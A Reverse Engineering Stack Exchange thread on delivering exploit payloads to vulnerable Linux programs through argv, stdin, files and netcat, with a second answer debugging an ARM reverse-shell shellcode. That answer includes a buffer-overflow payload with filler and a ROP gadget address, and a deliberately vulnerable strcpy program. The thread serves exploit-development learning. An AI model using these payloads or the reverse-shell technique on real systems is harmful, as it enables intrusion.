{
    "title": "Managing inputs for payload injection?",
    "link": "https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection",
    "content": "I am looking for a complete list of the ways to inject a payload in a vulnerable program in a Unix (Linux) context depending on the inputs opened by the program.\nI know that there are several tricks and tips but an exhaustive list would definitely help here.\n",
    "votes": "20",
    "answers": 2,
    "views": "38k",
    "tags": [
        "linux",
        "exploit",
        "binary"
    ],
    "user": "perror",
    "time": "Nov 14, 2016 at 16:13",
    "comments": [],
    "answers_data": [
        {
            "content": "Injecting payload and hexadecimal addresses through program inputs depends on the type of input you get. Here is a list of all the possible inputs and the way to do it with both a pure shell environment and from within <pre><code>gdb</code></pre>.\nGetting inputs from <pre><code>char *argv[]</code></pre>\nIn this case, the arguments are read from the initial command line, so the most convenient thing is:\n<pre><code>$> ./program $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\nIn <pre><code>gdb</code></pre>, you need to pass the arguments through the <pre><code>run</code></pre> command line like this:\n<pre><code>(gdb) run $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\nGetting inputs from a file\nHere, you have no other choice but write in the file and then feed your program with this file like this:\n<pre><code>$> ./program ./myfile.txt\n</code></pre>\nAnd, within <pre><code>gdb</code></pre>, it should look like this:\n<pre><code>(gdb) run myfile.txt\n</code></pre>\nThen, outside of <pre><code>gdb</code></pre> you can rewrite the content of the file and run your program again and again in <pre><code>gdb</code></pre>.\nGetting inputs from <pre><code>stdin</code></pre>\nGetting the input through <pre><code>stdin</code></pre> can be achieve through a wide variety of functions such as <pre><code>fgets()</code></pre>, <pre><code>scanf()</code></pre>, <pre><code>getline()</code></pre>, <pre><code>read()</code></pre> and others. It raises a few problems because the program stop while executing and wait to be fed with characters. And, you would prefer to just have one feed at the beginning to try your stuff and see the result. Let see how to deal with this input.\nIn case you have to deal with several inputs (eg login, password, ...), you need to use separators between the inputs. Usually the separator between each input is just a newline character (<pre><code>\n</code></pre> or <pre><code>\\r</code></pre> depending on the system you are in).\nNow, you have two ways of doing to feed the <pre><code>stdin</code></pre>. Either you go through a file, like this:\n<pre><code>$> cat ./mycommands.txt | ./program\n</code></pre>\nThe <pre><code>stdin</code></pre> requires to run the command either through a file like this:\n<pre><code>(gdb) run < ./mycommands.txt\n</code></pre>\nAnd do as said in the previous case.\nThe other option is to pipe the output of a command to the <pre><code>stdin</code></pre> of the program like this:\n<pre><code>$> echo -ne \"\\xef\\xbe\\xad\\xde\" | ./program\n</code></pre>\nIn <pre><code>gdb</code></pre> you can use the <pre><code>bash</code></pre> process substitution <pre><code><(cmd)</code></pre> trick:\n<pre><code>(gdb) run < <(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\nThis way is much quicker than effectively creating a named pipe and branch your program on it as recommended on several websites. Creating the named pipe outside of <pre><code>gdb</code></pre> requires a lot of unnecessary steps where you have it instantly with the previous technique.\nNote also that, some people are using <pre><code><<$(cmd)</code></pre> like this:\n<pre><code>(gdb) run <<< $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\nBut, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).\nGetting inputs from network\nHere, you need to use another tool called <pre><code>netcat</code></pre> (the Swiss army knife of networking), often shortened into <pre><code>nc</code></pre>. Basically, if your vulnerable program is listening on <pre><code>localhost:666</code></pre> then the command line would be:\n<pre><code>$> echo -ne \"\\xef\\xbe\\xad\\xde\" | nc -vv localhost 666\n</code></pre>\nWithin <pre><code>gdb</code></pre>, the point will be to run (<pre><code>r</code></pre>) the program and to connect to it from another terminal.\nKeep the <pre><code>stdin</code></pre> open after injection\nMost of the techniques for <pre><code>stdin</code></pre> will send the exploit string to the program which will end shortly after the termination of the input. The best way to keep it open afterward and get an active shell is to add a <pre><code>cat</code></pre> waiting for input on its <pre><code>stdin</code></pre>. It should look like this if you go though a file:\n<pre><code>$> (cat ./mycommands.txt; cat) | ./program\n</code></pre>\nOr, like this if you want a shell command:\n<pre><code>$> (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | ./program\n</code></pre>\nOr, finally, if you are going through the network:\n<pre><code>$> (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | nc -vv localhost 666\n</code></pre>\nNote that I did not find how to do with <pre><code>gdb</code></pre> to keep the input open once the payload has been delivered.\n\nUpdate about Python3\nYou may have noticed that Python changed its way of handling raw bytes when going through the function <pre><code>print()</code></pre>. As an example you can have this kind of behavior (here is a comparison of the Python2 and Python3 behavior):\n<pre><code>#> python2.7 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef 0a                                ....\n#> python3.9 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: c39e c2ad c2be c3af 0a                   .........\n</code></pre>\nAs you noticed, in Python3, the output of <pre><code>print()</code></pre> is expressed in UTF-8 characters which change a lot the result of the command. This is not really convenient when you try to send a sequence of selected bytes to the program you attack.\nSo, if you are stuck with a system that offers nothing but a Python3 interpreter here is the command line to use:\n<pre><code>python3.9 -c 'import sys; sys.stdout.buffer.write(b\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef                                ....\n</code></pre>\nYou may notice that the command in Python3 is quite more complex than the one in Python2 which somehow ruin a bit the simplicity of the original command. If someone has a shorter and simpler way to achieve this, please drop a comment to this article, I am really looking forward it!\nAn alternate way of doing it can use the <pre><code>echo</code></pre> command like that:\n<pre><code>#> echo -ne \"\\xde\\xad\\xbe\\xef\" | xxd\n00000000: dead beef                                ....\n</code></pre>\nBut, you cannot use the usual Python syntax such as <pre><code>\"\\x90\" * 12 + \"\\xde\\xad\\xbe\\xef\"</code></pre> which can be annoying if you want to look for the proper padding.\n",
            "votes": "31",
            "user": "perror",
            "time": "Sep 24, 2021 at 13:53",
            "is_accepted": true,
            "comments": [
                {
                    "user": "TruckerCat",
                    "text": "<span class=\"comment-copy\">Thank you, this was really helpful for me. I looked for a way to pass shell code to a function like fgetc.  First I got  <code>/bin/bash: warning: here-document at line 0 delimited by end-of-file (wanted python)</code>, when using <code>(gdb) r &lt; &lt;(python exploit.py)</code>. To resolve this I removed spaces from the end of my python script, as suggested in this answer  <a href=\"https://stackoverflow.com/questions/18660798/here-document-gives-unexpected-end-of-file-error\" title=\"here document gives unexpected end of file error\">stackoverflow.com/questions/18660798/â€¦</a>. Now it works  :-)</span>",
                    "time": null
                },
                {
                    "user": "iMil",
                    "text": "<span class=\"comment-copy\"><i>[...]this last technique seems to filter out all NULL bytes (for whatever reason)[...]</i>: using <code>/bin/echo</code> works in both cases, meaning it's built-in's <code>gdb</code> who's messing with <code>\\x0</code>'s.</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">@iMil Indeed, I am using <code>echo -ne</code> by now... I should (and I will) update the article to refer about this. Thanks for mentioning it !</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">@iMil I finally took the time to change the article to <code>echo</code> only... Sorry for the long delay.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "Maybe my investigation will be helpful for somebody.\nBrief:\nI've prepare the reverse shellcode in assembler for ARM architecture (Raspberry Pi 1 B emulated in Qemu). When I start to test it I encounter few strange behaviours, which I would like to share.\nPreparation:\n\nfile:\n<pre><code>reverseShell.s</code></pre>\n\n\n\n\nlanguage:\nassembler for ARM architecture (Raspberry Pi 1 B)\n\n\n\n\ncompilation:\n<pre><code>as reverseShell.s -o reverseShell.o && ld -N reverseShell.o -o reverseShell</code></pre>\n\n\n\n\nexecution:\n4.1. host system:\n<pre><code>   nc -lvvp 4444\n   Listening on [0.0.0.0] (family 0, port 4444)\n</code></pre>\n4.2. target: (Raspberry Pi 1 B):\n<pre><code>  `./ReverseShell`\n</code></pre>\n4.3. host system:\n<pre><code>   Connection from arm 60036 received!\n   pwd\n   /home/user/ARM/03_Security\n</code></pre>\n\n\n\nOK, looks good for now\nGenerating the payload (hex dump):\n\ntranslate the execution to binary\n\n<pre><code>   objcopy -O binary ReverseShell ReverseShell.bin\n</code></pre>\n\ndump to hexadecimal format (convert to payload)\n\n<pre><code>   hexdump -v -e '\"\\\\\"\"x\" 1/1 \"%02x\" \"\"' ReverseShell.bin\n   \\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a.....\n</code></pre>\n\nIn this step, the appropriate number of filler was added at the beginning of the payload - like almost everybody - I used character 'A' which is 41hex. The number of the character depends on the buffer which will be overwritten - in my case it was 12 characters.\n\nNext step was to find the base address of the libc-2.27.so in the virtual memory map and the address of the useful gadget in the libc-2.27.so. For me the best tool for searching the gadgets is ropper. The start address (base) of the libc-2.27 (maybe in your case it will be different library version and different address) in my case was: <pre><code>0xb6ede000</code></pre>. The gadget address was: <pre><code>0x00003db9</code></pre>. After gluing: <pre><code>0xb6ee1db9</code></pre>. This hexadecimal adres form must be paste after the filler and before the payload. So now, the beginning of the payload (together with filler and gadget address) was:\n\n\n<pre><code>\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\x01\\......\n</code></pre>\nPassing the payload to the vulnerable program:\n\nThe vulnerable program:\n\n<pre><code>    #include <stdio.h>\n    #include <string.h>\n    \n    void func1(char *s)\n    {\n      char buffer[8];\n      strcpy(buffer, s);\n    }\n    \n    int main(int argc, char *argv[])\n    {\n      func1(argv[1]);\n      printf(\"Everything is fine.\n\");\n    }\n</code></pre>\n\ngdb (gef) session\n\nI run the gdb with argument as a payload like below:\n<pre><code>gdb --args ./program $(python2.7 -c- 'print(\"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\...\")')\n</code></pre>\nPut the breakpoint on the main and run. Still looks OK. I can put the breakpoint in the func1, just before returning from them:\n\nIn this point, the stack should already be overwritten and after  `pop', the program should branch to previously glued gadget address and start to execute the program from the previously \"prepared\" stack. Sooo let's have a look on the content of the stack:\n\nred digits:\n1 - ok, this is the filler 12 times 'A' character\n2 - the gadget address - still ok\n3 - the beginning of the payload\n4 - Ops, something went wrong, this part of payload should be:\nx13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\nbut corresponding part of the memory is:\n0xe12fff13   0x21010002\nWhy in second word instead of 0x20 I have 0x00 ?\nOk, I've try to do this with python 3, but NULL will be there even with Python3.\nThis is only the one question. Did you encounter similar situation. What even more interesting, when I change the strcpy() to memcpy() in the func1(), and copy whole payload - 96 bytes, I have still 0 in this place. Am I lost something? I have no NULL's on the payload. Of course the session will crashed with segmentation fault, but I don't expect nothing different. As you can see, the number of NULL's is bigger, further in the memory dump, but no idea why.\n",
            "votes": "1",
            "user": "robi251",
            "time": "Oct 25, 2022 at 10:32",
            "is_accepted": false,
            "comments": [
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">Python3 prints only UTF-8 outputs, so if it encounters some <code>\\x20</code>, it won't print the byte but the string <code>\"\\x20\"</code>. Which is really irritating because python2 was working properly.</span>",
                    "time": null
                },
                {
                    "user": "robi251",
                    "text": "<span class=\"comment-copy\">Yes, you are right in case, when we are using Python3, but in abow example I'm using Python 2</span>",
                    "time": null
                }
            ]
        }
    ]
}